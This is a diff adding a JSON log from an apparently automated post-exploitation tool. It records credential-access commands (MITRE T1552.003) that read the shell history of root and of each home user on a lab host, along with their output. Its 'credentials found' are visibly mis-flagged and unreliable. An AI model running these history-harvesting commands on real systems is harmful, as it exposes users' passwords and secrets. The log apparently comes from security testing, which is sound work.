@@ -1,0 +1,84 @@
+{
+  "timestamp": 1785853149.375883,
+  "target_ip": "172.24.0.2",
+  "source": "bash_history_read",
+  "data": {
+    "severity": "HIGH",
+    "elapsed": 0.5238585472106934,
+    "mitres": [
+      {
+        "name": "Unsecured Credentials: Bash History",
+        "mitre_id": "T1552.003",
+        "mitre_tactic": "Credential Access",
+        "description": "Lecture du fichier .bash_history pour extraire des commandes contenant des credentials en clair."
+      }
+    ],
+    "results": {
+      "credentials_found": [
+        {
+          "source": "bash_history",
+          "type": "mysql/mariadb password",
+          "line": "mysqldump -u root -p appdb > backup.sql",
+          "match": "-p appdb"
+        },
+        {
+          "source": "bash_history",
+          "type": "mysql/mariadb password",
+          "line": "ansible-playbook -i inventory/prod site.yml",
+          "match": "-playbook"
+        }
+      ],
+      "credentials_count": 2,
+      "sensitive_lines_count": 2,
+      "commands": {
+        "cat ~/.bash_history 2>/dev/null || echo 'BASH_HISTORY_DENIED'": {
+          "stdout": "apt update && apt upgrade -y\nsystemctl status nginx\nsystemctl status mysql\ndocker ps -a\ndocker compose -f /opt/app/docker-compose.yml up -d\ntail -f /var/log/nginx/access.log\ncd /var/www/app && git pull origin main\npython3 manage.py migrate\nsystemctl restart gunicorn\nmysql -u root -p\ncat /etc/passwd\nssh devops@10.0.1.10\ncrontab -l\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.zsh_history 2>/dev/null || echo 'ZSH_HISTORY_DENIED'": {
+          "stdout": "ZSH_HISTORY_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.history 2>/dev/null || echo 'HISTORY_DENIED'": {
+          "stdout": "HISTORY_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat ~/.sh_history 2>/dev/null || echo 'SH_HISTORY_DENIED'": {
+          "stdout": "SH_HISTORY_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.bash_history 2>/dev/null || echo 'ROOT_BASH_HISTORY_DENIED'": {
+          "stdout": "apt update && apt upgrade -y\nsystemctl status nginx\nsystemctl status mysql\ndocker ps -a\ndocker compose -f /opt/app/docker-compose.yml up -d\ntail -f /var/log/nginx/access.log\ncd /var/www/app && git pull origin main\npython3 manage.py migrate\nsystemctl restart gunicorn\nmysql -u root -p\ncat /etc/passwd\nssh devops@10.0.1.10\ncrontab -l\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "cat /root/.zsh_history 2>/dev/null || echo 'ROOT_ZSH_HISTORY_DENIED'": {
+          "stdout": "ROOT_ZSH_HISTORY_DENIED\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "ls /home/ 2>/dev/null": {
+          "stdout": "appservice\ndbadmin\ndeploy\ndevops\nmonitor\nsandbox\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "for u in $(ls /home/); do echo \"=== $u ===\"; cat /home/$u/.bash_history 2>/dev/null; done": {
+          "stdout": "=== appservice ===\nsystemctl status nginx\nsystemctl status php-fpm\ntail -f /var/log/app/access.log\ncd /var/www/app\ngit pull origin main\nsystemctl reload nginx\n=== dbadmin ===\nmysql -u root -p\nmysqldump -u root -p appdb > backup.sql\npsql -U postgres -d appdb\npg_dump appdb > pg_backup.sql\nls /var/backups/db/\n=== deploy ===\nls /var/www/app\ncd /var/www/app && git status\ngit pull origin main\npython3 -m pytest tests/ -v\nsystemctl status gunicorn\ntail -n 100 /var/log/app/error.log\ncat /var/www/app/.env\nssh deploy@10.0.2.10\n=== devops ===\nssh bastion\ndocker compose up -d\nkubectl get pods -n production\nansible-playbook -i inventory/prod site.yml\nterraform plan -out=tfplan\ngit log --oneline -20\nvim /etc/nginx/sites-available/app.conf\nnginx -t\nsystemctl reload nginx\npip install -r requirements.txt\npython3 scripts/deploy.py --env=prod\ncat .env.prod\nls ~/.ssh/\n=== monitor ===\nsystemctl status prometheus\nsystemctl status grafana-server\ntail -f /var/log/prometheus/prometheus.log\ncurl -s http://localhost:9090/api/v1/query?query=up\ncat /opt/monitoring/agent/config.yml\n=== sandbox ===\nls\ncd Documents\ncat notes-maths.txt\ncd ~/Downloads\nls -la\ncd ~/Music\nmpv musique.mp3\npython3 -c \"print('Hello')\"\nnode -e \"console.log('test')\"\ncd ~/Desktop\nfirefox &\nnano devoir.docx\ncd ~/Pictures\neog vacances.jpg\nssh github.com\ngit clone https://github.com/eleve/projet.git\ncat ~/Documents/mdp.txt\nexit\n",
+          "stderr": "",
+          "returncode": 0
+        },
+        "wc -l ~/.bash_history /root/.bash_history 2>/dev/null || true": {
+          "stdout": " 13 /root/.bash_history\n 13 /root/.bash_history\n 26 total\n",
+          "stderr": "",
+          "returncode": 0
+        }
+      },
+      "success_number": 9,
+      "success_rate": 1.0
+    }
+  }
+}
